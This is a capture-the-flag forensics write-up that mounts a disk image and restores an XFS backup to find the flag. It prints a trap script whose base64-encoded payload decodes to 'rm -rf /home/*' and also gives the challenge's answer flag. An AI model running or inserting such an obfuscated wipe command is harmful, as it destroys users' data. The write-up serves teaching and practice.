# Un boulevard pour pointer

## Challenge
Un script malveillant est présent dans le challenge. La protection de vos données est à votre charge.

Eh petit.e, c'est à toi de jouer. J'ai jeté toutes mes boules et aucune n'est proche du cochonnet. Par contre, tu peux peut-être t'appuyer sur elles pour pointer.

Trouvez le flag. Le fichier une fois décompressé fait 6GO

## Solution

```console
$ file image.img
image.img: DOS/MBR boot sector
$
$ sudo fdisk -lu image.img
Disk image.img: 6 GiB, 6442450944 bytes, 12582912 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: gpt
Disk identifier: 3249E840-24CF-40DC-BDC8-FD95544D3951

Device        Start      End  Sectors  Size Type
image.img1     2048    18431    16384    8M BIOS boot
image.img2    18432 11552767 11534336  5,5G Linux root (x86-64)
image.img3 11552768 12582878  1030111  503M Linux filesystem
```

```console
$ sudo kpartx -l image.img
loop31p1 : 0 16384 /dev/loop31 2048
loop31p2 : 0 11534336 /dev/loop31 18432
loop31p3 : 0 1030111 /dev/loop31 11552768
$ sudo kpartx -a image.img
```

Mount the biggest partition:
```console
$ sudo mount /dev/mapper/loop31p2 /mnt/img
```

Looking into root/, we find another file `boule-3.pdf`, so we're one the right track:
```console
$ sudo ls -al root/
total 240
drwx------  7 root    root       156 mai    4 15:21 .
drwxr-xr-x 16 root    root       211 mai    4 14:29 ..
-rw-------  1 root    root       319 mai    4 15:03 .bash_history
drwxr-xr-x  2 root    root         6 déc.   8 11:29 bin
-rw-r--r--  1 thesee  thesee  231710 mai    4 14:49 boule-3.pdf
drwx------  3 root    root        31 mai    4 14:43 .cache
drwx------  2 root    root         6 déc.   8 11:29 .gnupg
-rwxr-xr-x  1 thesee  thesee     224 mai    4 14:48 health-check.sh
drwxr-xr-x  4 root    root        66 mai    4 14:26 inst-sys
drwx------  2 root    root         6 mai    4 14:43 .ssh
-rw-------  1 root    root        66 mai    4 15:21 .xauthHtJAB3
```

Looking at the script `health-check.sh`:
```console
$ sudo cat root/health-check.sh
#!/bin/bash
curl https://flag.challenges.404ctf.fr

echo "!!! this script is really mean. Do you really want to run it ? !!!"
read answer

if  [ $answer = Yes ]; then
    echo "cm0gLXJmIC9ob21lLyo7" | base64 -d | /bin/sh
fi
```

https://flag.challenges.404ctf.fr is a rabbit hole

And that `base64 string` is really nasty:
```console
$ echo -n cm0gLXJmIC9ob21lLyo7 | base64 -d
rm -rf /home/*;
```

Looking at the `bash history`, we see the creation of a `backup` in `/var`:
```console
$ sudo cat root/.bash_history
#1714827044
mv health-check.sh ~
#1714827049
mv boule-3.pdf
#1714827052
mv boule-3.pdf ~
#1714827053
cd
#1714827054
l
#1714827060
cd /var
#1714827069
mkdir backup; cd backup
#1714827430
zypper install xfsdump
#1714827478
xfsdump -l 0 -f backup_home.xfsdump /home
#1714827499
l
#1714827502
cd
#1714826888
zypper update
```

Indeed we can find that a `XFS backup` file:
```console
$ ls -al var/backup/
total 72712
drwxr-xr-x  2 root root       33 mai    4 14:57 .
drwxr-xr-x 11 root root      179 mai    4 14:51 ..
-rw-r--r--  1 root root 74455328 mai    4 14:58 backup_home.xfsdump
$ file var/backup/backup_home.xfsdump
var/backup/backup_home.xfsdump: xfsdump archive (version 3)
```

Let's restore that backup and investigate it:
```console
$ sudo xfsrestore -f backup_home.xfsdump /mnt/backup/
$ ls /mnt/backup/
nicochonnet
$ ls /mnt/backup/nicochonnet/Documents
cochonnet.pdf
```

[cochonnet.pdf](./cochonnet.pdf)

## Flag
> 404CTF{bi1_joué_br4vo_c_le_fl4g}
